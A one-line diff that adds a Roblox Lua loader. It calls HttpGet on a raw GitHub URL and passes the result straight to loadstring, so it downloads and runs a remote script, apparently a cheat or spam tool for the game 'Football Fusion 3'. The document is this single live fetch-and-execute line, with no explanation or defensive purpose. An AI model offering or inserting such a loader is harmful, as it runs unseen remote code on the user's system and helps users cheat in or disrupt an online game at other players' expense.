@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/football-fusion-3-spam1-aiuh4cb9oejxf6.lua"))()
